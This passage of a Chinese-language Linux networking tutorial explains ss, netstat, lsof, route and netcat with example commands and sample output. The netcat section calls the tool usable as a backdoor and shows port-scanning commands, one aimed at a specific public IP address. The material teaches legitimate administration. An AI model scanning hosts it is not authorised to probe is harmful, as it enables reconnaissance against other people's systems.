<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ss -at <span class="s1">&#39;( dport = :22 or sport = :22 )&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">State      Recv-Q Send-Q     Local Address:Port       Peer Address:Port                
</span></span><span class="line"><span class="cl">LISTEN     <span class="m">0</span>      <span class="m">128</span>             *:ssh                     *:*                    
</span></span><span class="line"><span class="cl">ESTAB      <span class="m">0</span>      <span class="m">0</span>          172.16.0.2:ssh           111.206.214.55:49374                
</span></span><span class="line"><span class="cl">ESTAB      <span class="m">0</span>      <span class="m">0</span>          172.16.0.2:ssh           61.50.248.5:optohost005          
</span></span><span class="line"><span class="cl">ESTAB      <span class="m">0</span>      <span class="m">36</span>         172.16.0.2:ssh           61.50.248.5:22008                
</span></span><span class="line"><span class="cl">ESTAB      <span class="m">0</span>      <span class="m">0</span>          172.16.0.2:ssh           61.50.248.5:optohost003          
</span></span><span class="line"><span class="cl">ESTAB      <span class="m">0</span>      <span class="m">0</span>          172.16.0.2:ssh           61.50.248.5:optohost004          
</span></span><span class="line"><span class="cl">LISTEN     <span class="m">0</span>      <span class="m">128</span>            <span class="o">[</span>::<span class="o">]</span>:ssh                 <span class="o">[</span>::<span class="o">]</span>:*                    
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">ss -at <span class="s1">&#39;( dport = :22 or sport = :22 )&#39;</span> -n
</span></span><span class="line"><span class="cl">State      Recv-Q Send-Q   Local Address:Port         Peer Address:Port              
</span></span><span class="line"><span class="cl">LISTEN     <span class="m">0</span>      <span class="m">128</span>           *:22                    *:*                  
</span></span><span class="line"><span class="cl">ESTAB      <span class="m">0</span>      <span class="m">0</span>        172.16.0.2:22              111.206.214.55:49374              
</span></span><span class="line"><span class="cl">ESTAB      <span class="m">0</span>      <span class="m">0</span>        172.16.0.2:22              61.50.248.5:22005              
</span></span><span class="line"><span class="cl">ESTAB      <span class="m">0</span>      <span class="m">36</span>       172.16.0.2:22              61.50.248.5:22008              
</span></span><span class="line"><span class="cl">ESTAB      <span class="m">0</span>      <span class="m">0</span>        172.16.0.2:22              61.50.248.5:22003              
</span></span><span class="line"><span class="cl">ESTAB      <span class="m">0</span>      <span class="m">0</span>        172.16.0.2:22              61.50.248.5:22004              
</span></span><span class="line"><span class="cl">LISTEN     <span class="m">0</span>      <span class="m">128</span>            <span class="o">[</span>::<span class="o">]</span>:22                    <span class="o">[</span>::<span class="o">]</span>:*      
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="仅显示监听套接字">仅显示监听套接字</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ss -ltn
</span></span></code></pre></td></tr></table>
</div>
</div><p>要列出所有侦听的udp连接，请将t替换为u</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ss -lun
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="显示时间信息">显示时间信息</h3>
<p>可以使用 <code>-o</code> 选项，来获得每个连接的时间信息。通过timer得知</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ss -tn -o
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">State      Recv-Q Send-Q     Local Address:Port    Peer Address:Port              
</span></span><span class="line"><span class="cl">ESTAB      <span class="m">0</span>      <span class="m">0</span>          172.16.0.2:22         61.50.248.5:22005   timer:<span class="o">(</span>keepalive,40min,0<span class="o">)</span>
</span></span><span class="line"><span class="cl">ESTAB      <span class="m">0</span>      <span class="m">0</span>          172.16.0.2:42930      169.254.0.55:5574               
</span></span><span class="line"><span class="cl">ESTAB      <span class="m">0</span>      <span class="m">0</span>          172.16.0.2:22         61.50.248.5:22008   timer:<span class="o">(</span>keepalive,64min,0<span class="o">)</span>
</span></span><span class="line"><span class="cl">ESTAB      <span class="m">0</span>      <span class="m">0</span>          172.16.0.2:44900      169.254.0.55:80     timer:<span class="o">(</span>keepalive,13sec,0<span class="o">)</span>
</span></span><span class="line"><span class="cl">ESTAB      <span class="m">0</span>      <span class="m">0</span>          172.16.0.2:22         61.50.248.5:22003   timer:<span class="o">(</span>keepalive,40min,0<span class="o">)</span>
</span></span><span class="line"><span class="cl">ESTAB      <span class="m">0</span>      <span class="m">36</span>         172.16.0.2:22         61.50.248.5:22012   timer:<span class="o">(</span>on,347ms,0<span class="o">)</span>
</span></span><span class="line"><span class="cl">ESTAB      <span class="m">0</span>      <span class="m">0</span>          172.16.0.2:39316      94.130.12.30:443    timer:<span class="o">(</span>keepalive,50sec,0<span class="o">)</span>
</span></span><span class="line"><span class="cl">ESTAB      <span class="m">0</span>      <span class="m">0</span>          172.16.0.2:22         61.50.248.5:22004   timer:<span class="o">(</span>keepalive,40min,0<span class="o">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="netstat">netstat</h3>
<p><em><strong>netstat</strong></em> (network statistics) 命令行工具，用于监视传入和传出的网络连接，以及查看路由表、接口统计等。netstat在所有类似Unix的操作系统上都可用，在Windows操作系统上也可用，是最基本的网络服务调试工具。</p>
<p>不过，现在<code>netstat</code> 命令早已被弃用，取而代之的是 <code>iproute</code> 套件中的 <code>ss</code>。ss 比起 <code>netstat</code>，<code>ss</code> 能够显示有关网络连接的详细信息，并且速度更快。<code>netstat</code> 从 <code>/proc</code> 文件收集信息，当有大量连接要打印时，<code>netstat</code> 效率很低。而<code>ss</code> 是直接从内核空间获取信息。并且<code>ss</code>命令在使用起来与<code>netstat </code>非常相似，用户几乎可以无缝切换。</p>
<blockquote>
<p><strong>各系统下的安装</strong></p>
<ul>
<li>
<p><strong>ss</strong></p>
</li>
<li>
<p>Ubuntu/Debian:  <code>iproute2</code>   ；<code>apt install iproute2</code></p>
</li>
<li>
<p>CentOS/Fedora: <code>iproute</code>  ；<code>yum install -y iproute</code></p>
</li>
<li>
<p>Apline：<code>iproute</code> ；<code>apk add --no-cache iproute</code></p>
</li>
<li>
<p><strong>netstat</strong></p>
</li>
<li>
<p>Ubuntu/Debian:  <code>net-tools</code>   ；<code>apt install net-tools</code></p>
</li>
<li>
<p>CentOS/Fedora: <code>net-tools</code>  ；<code>yum install -y net-tools</code></p>
</li>
<li>
<p>Apline：<code>net-tools</code> ；<code>apk add --no-cache net-tools</code></p>
</li>
</ul>
</blockquote>
<ul>
<li>列出所有tcp与udp的连接的所有端口 <code>netstat -a</code></li>
<li>仅列出tcp (<strong>Transmission Control Protocol</strong>)  端口的连接 <code>netstat -at</code></li>
<li>仅列出udp (<strong>User Datagram Protocol</strong> )   端口的连接 <code>netstat -au</code></li>
<li>列出所有活动监听端口连接 <code>netstat -l</code></li>
<li>列出TCP监听端口 <code>netstat -lt</code></li>
<li>列出udp监听端口 <code>netstat -lu</code></li>
<li>列出unix socket 监听端口 <code>netstat -lx</code></li>
<li>显示统计信息 <code>netstat -s</code></li>
<li>显示tcp的统计信息 <code>netstat -st</code></li>
<li>显示udp的统计信息 <code>netstat -su</code></li>
<li>显示服务名与PID号 <code>netstat -tp</code></li>
<li>显示混杂模式，类似<code>watch</code> 每5s 刷新 <code>netstat -ac 5 | grep tcp</code></li>
<li>显示内核路由表，类似<code> route -n</code> 命令；<code>netstat -r</code></li>
<li>显示网络接口数据包事务，包括传输和接收MTU大小的数据包。 <code>netstat -i</code></li>
<li>显示内核接口表，类似 <code>ifconfig</code> 命令。 <code>netstat -ie</code></li>
<li>显示IPv4和IPv6的广播信息。<code>netstat -g</code></li>
<li>混杂模式，间隔时间打印netstat命令的信息 <code>netstat -c [second] -ltnp</code></li>
<li>显示原始网络信息统计 <code>netstat --statistics --raw</code></li>
</ul>
<h2 id="lsof">lsof</h2>
<p><em><strong>lsof</strong></em> (LiSt Open Files)，主要用来找出哪个进程打开了哪些文件。众所周知，Linux是一个基于文件的操作系统（管道、套接字、目录、设备等）。使用lsof也可以排查一些网络问题。如未关闭的文件不能被移动或删除，网络端口使用的文件等，都可以通过lsof快速定位。</p>
<blockquote>
<p><strong>各系统下的安装</strong></p>
<ul>
<li>Ubuntu/Debian: <code>lsof</code>  ；<code>apt install lsof</code></li>
<li>CentOS/Fedora: <code>lsof</code> ；<code>yum install -y lsof</code></li>
<li>Apline：<code>lsof </code> ；<code>apk add lsof --no-cache</code></li>
</ul>
</blockquote>
<h3 id="列出所有打开的文件">列出所有打开的文件</h3>
<p>不带任何参数的情况下运行lsof，可以列出所有打开的文件</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">lsof
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="列出用户进程使用的文件">列出用户进程使用的文件</h3>
<p>lsof 可以查看特定用户进程使用的哪些文件，使用<code>-u</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">lsof -u root
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="根据网络地址查找文件">根据网络地址查找文件</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">lsof -i <span class="m">4</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="按照程序名称列出所打卡的文件">按照程序名称列出所打卡的文件</h3>
<p>这里不必使用完整的程序名，会列出所有以 name开头的进程应用使用的文件</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">lsof -u nginx
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="列出进程使用的文件">列出进程使用的文件</h3>
<p>使用 <code>-p [pid]</code> k可以显示进程打开的文件，可以通过 <code>^</code> 来排除特定的PID。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">lsof -p <span class="o">[</span>pid<span class="o">]</span>
</span></span><span class="line"><span class="cl">lsof -p <span class="o">[</span>^pid<span class="o">]</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="找到使用文件的进程">找到使用文件的进程</h3>
<p>使用 <code>-t</code> 餐食可以找到哪些进程使用了该文件</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">lsof -t <span class="o">[</span>file_name<span class="o">]</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="列出目录中所有打开的文件">列出目录中所有打开的文件</h3>
<p><code>+D</code> 餐食可以对目录的所有打开实例（包括它包含的所有文件和目录）进行搜索。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">lsof +D <span class="o">[</span>dir<span class="o">]</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="列出网络文件">列出网络文件</h3>
<p><code>-i</code> 侦听特定端口号的进程或应用程序，如检查了哪个程序进程正在使用端口80。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">lsof -i:80  
</span></span></code></pre></td></tr></table>
</div>
</div><p>还可以根据端口范围进程查找</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">lsof -i:1-1024
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="根据网络连接类型来查找文件">根据网络连接类型来查找文件</h3>
<p>lsof还可以根据连接的类型列出文件。例如，TCP使用的文件</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">lsof -i tcp
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="拿到进程的父进程id">拿到进程的父进程ID</h3>
<p><code>lsof -R</code> 可以拿到进程的父进程IP输出中列出父进程标识（PPID Parent Process IDentification）。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">lsof -p <span class="o">[]</span> -R
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="查看用户的网络连接">查看用户的网络连接</h3>
<p>结合使用 <code>-i</code> 和 <code>-u</code> 命令行选项，我们可以搜索Linux用户的所有网络连接。可以按照需要检查一个被黑客攻击的系统，如我们检查用户root的所有网络活动：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">lsof -a -i -u root
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="列出所有内存映射文件">列出所有内存映射文件</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">lsof -d mem
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="route">route</h2>
<p>在Linux中，route命令用于处理IP/内核路由表。主要用于通过网络接口建立到主机/IP的静态路由。它用于显示或更新IP/内核路由表。</p>
<blockquote>
<p><strong>各系统下的安装</strong></p>
<ul>
<li>Ubuntu/Debian: <code>net-tools</code>  ；<code>apt install net-tools</code></li>
<li>CentOS/Fedora: <code>net-tools</code> ；<code>yum install -y net-tools</code></li>
<li>Apline：<code>net-tools </code> ；<code>apk add net-tools --no-cache</code></li>
</ul>
</blockquote>
<p>route命令不加任何参数，默认情况下将显示内核路由表条目的详细信息。当包在这个路由IP范围内发送时，通过ARP协议找到目的地的MAC地址，包将被发送到MAC地址。</p>
<p>当在路由条目中找不到对应的路由信息，数据包将被转发到默认网关，该网关决定该数据包的进一步路由。</p>
<p>route命令不加参数，会在输出时显示为主机名，这时解析会影响性能。可以使用 <code>-n</code> 选项请求不显示主机名。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">route -n
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="添加默认网关">添加默认网关</h3>
<p>可以使用 <code>route add</code> 命令添加一个默认网关。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">route add default gw 10.0.0.1
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="添加一条路由">添加一条路由</h3>
<p>这里添加一条，将通过10.0.0.0/24的流量由eth0设备通过 添加一条路由，如下所示。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">route add -net 10.0.0.0 netmask 255.255.255.0 dev eth0
</span></span></code></pre></td></tr></table>
</div>
</div><p>-net 目标网络</p>
<p>dev 将规则和设备关联在一起</p>
<p><strong>添加一个目标主机</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">route add -host 12.123.0.10 gw 192.168.1.1 enp0s3
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="列出内核路由表信息">列出内核路由表信息</h3>
<p>内核维护了路由缓存以更快地路由数据包。可以使用 <code>-C</code> 来打印内核的路由缓存信息。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">route -Cn
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Kernel IP routing cache
</span></span><span class="line"><span class="cl">Source          Destination     Gateway         Flags Metric Ref    Use Iface
</span></span><span class="line"><span class="cl">10.0.0.4        10.0.0.1        10.0.0.1              <span class="m">0</span>      <span class="m">1</span>        <span class="m">0</span> eth0
</span></span><span class="line"><span class="cl">10.0.0.1        10.0.0.4        10.0.0.4        il    <span class="m">0</span>      <span class="m">0</span>       <span class="m">44</span> lo
</span></span><span class="line"><span class="cl">10.0.0.1        10.0.0.255      10.0.0.255      ibl   <span class="m">0</span>      <span class="m">0</span>        <span class="m">7</span> lo
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="拒绝路由到特定的主机">拒绝路由到特定的主机</h3>
<p>有些场景下，可能需要拒绝数据包路由到特定的主机/网络。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">route add -host 192.168.1.51 reject
</span></span></code></pre></td></tr></table>
</div>
</div><p>可以看到路由已经不会路由该流量了</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ping 10.0.0.2
</span></span><span class="line"><span class="cl">connect: No route to host
</span></span></code></pre></td></tr></table>
</div>
</div><p>如果需要拒绝整个网络可以这样</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">route add -net 192.168.1.0 netmask 255.255.255.0 reject
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="删除一条路由">删除一条路由</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"># 删除默认路由
</span></span><span class="line"><span class="cl">route del default
</span></span><span class="line"><span class="cl"># 删除刚才添加的拒绝路由
</span></span><span class="line"><span class="cl">route del -host 10.0.0.2 reject
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="ncat--netcatnc--nmap">ncat &amp; netcat(nc) &amp; nmap</h2>
<p>netcat（简称nc）是一款功能强大的网络命令行工具，用于在Linux中执行与TCP、UDP或UNIX域套接字相关的任何操作。netcat可以用于端口扫描、端口重定向，作为端口监听器（用于传入连接）；它还可以用来打开远程连接和其他许多事情。此外，还可以将其用作访问目标服务器的后门。netcat还因此被称为TCP/IP的“瑞士军刀”。</p>
<blockquote>
<p><strong>各系统下的安装</strong></p>
<ul>
<li>Ubuntu/Debian:  <code>netcat</code>   ；<code>apt install netcat</code></li>
<li>CentOS/Fedora: <code>nc</code>  ；<code>yum install -y nc</code></li>
<li>Apline：<code>netcat-openbsd</code> ；<code>apk add --no-cache netcat-openbsd</code></li>
</ul>
</blockquote>
<h3 id="端口扫描-1">端口扫描</h3>
<p>netcat可以用于端口扫描：了解哪些端口是开放的，并且在目标机器上运行服务。它可以扫描单一或多个开防的端口。如示例，<code>-z</code> 选项将nc设置为只扫描监听守护进程，而不实际向它们发送任何数据。<code>-v</code> 选项启用详细模式，<code>-w</code> 为无法建立连接时超时时间。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nc -v -w <span class="m">10</span> -z 195.133.11.43 <span class="m">22</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Ncat: Version 7.50 <span class="o">(</span> https://nmap.org/ncat <span class="o">)</span>
</span></span><span class="line"><span class="cl">Ncat: Connected to 195.133.11.43:22.
</span></span><span class="line"><span class="cl">Ncat: <span class="m">0</span> bytes sent, <span class="m">0</span> bytes received in 0.25 seconds.
</span></span></code></pre></td></tr></table>
</div>
</div><p>也可以扫描一个范围</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nc -v -n -z -w <span class="m">1</span> 127.0.0.1 1-1000
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="在服务器间传送文件">在服务器间传送文件</h3>
<p>netcat可以在两台服务器之间传输文件，这两个系统都必须安装nc。例如，要将ISO映像文件从一台计算机复制到另一台计算机并监视传输进度（使用pv），请在发送方/接收端上运行以下命令。</p>
<p>将以<code>netcat</code> 的监听模式 <code>-l</code>。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">tar -zcf - debian-10.0.0-amd64-xfce-CD-1.iso  <span class="p">|</span> pv <span class="p">|</span> nc -l -p <span class="m">3000</span> -q <span class="m">5</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>在接受端运行命令</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nc 192.168.1.4 <span class="m">3000</span> <span class="p">|</span> pv <span class="p">|</span> tar -zxf -
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="使用netcat实现一个命令行聊天服务器">使用netcat实现一个命令行聊天服务器</h3>
<p>可以使 <code>netcat</code> 创建一个简单的命令行消息服务器，前提条件是nc必须安装在两个系统上。在服务端，运行命令来创建监听端口5555的聊天服务器。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nc -l -vv -p <span class="m">5000</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>在客户端上，运行命令连接到服务端进行聊天会话。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nc <span class="o">{</span>ip<span class="o">}</span> <span class="m">5000</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="使用nc创建一个web服务器">使用nc创建一个web服务器</h3>
<p>使用nc <code>-l</code> 选项可以创建一个基础的不安全的web服务器，需要一个静态html文件。然后可以通过 <code>while</code> 保持netcat命令不退出。正常情况下，netcat在连接断开时退出。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="k">while</span> : <span class="p">;</span> <span class="k">do</span> <span class="o">(</span> <span class="nb">echo</span> -ne <span class="s2">&#34;HTTP/1.1 200 OK\r\n&#34;</span> <span class="p">;</span> cat 1.html<span class="p">;</span> <span class="o">)</span> <span class="p">|</span> nc -l -p <span class="m">8080</span> <span class="p">;</span> <span class="k">done</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$ while : ; do ( echo -ne &#34;HTTP/1.1 200 OK\r\n&#34; ; cat 1.html; ) | nc -l -p 8080 ; done
</span></span><span class="line"><span class="cl">GET / HTTP/1.1
</span></span><span class="line"><span class="cl">Host: ip:8080
</span></span><span class="line"><span class="cl">Connection: keep-alive
</span></span><span class="line"><span class="cl">Upgrade-Insecure-Requests: 1
</span></span><span class="line"><span class="cl">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36
</span></span><span class="line"><span class="cl">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
</span></span><span class="line"><span class="cl">Accept-Encoding: gzip, deflate
</span></span><span class="line"><span class="cl">Accept-Language: zh-TW,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-CN;q=0.6
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="网络故障排查">网络故障排查</h3>
<p>netcat 主要常用的一个方面时排查网络连接故障，可以使用 <code>netcat</code> 来验证服务器正在发送哪些数据以响应客户端发出的命令。</p>
<p>使用命令的可以输出包括web服务器发送的标头，这些标头可用于故障排除。也可以使用 <code>curl</code> 等命令进行同样的操作。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">printf</span> <span class="s2">&#34;GET / HTTP/1.0\r\n\r\n&#34;</span> <span class="p">|</span> nc baidu.com <span class="m">80</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">HTTP/1.1 <span class="m">200</span> OK
</span></span><span class="line"><span class="cl">Date: Mon, <span class="m">28</span> Jun <span class="m">2021</span> 12:16:55 GMT
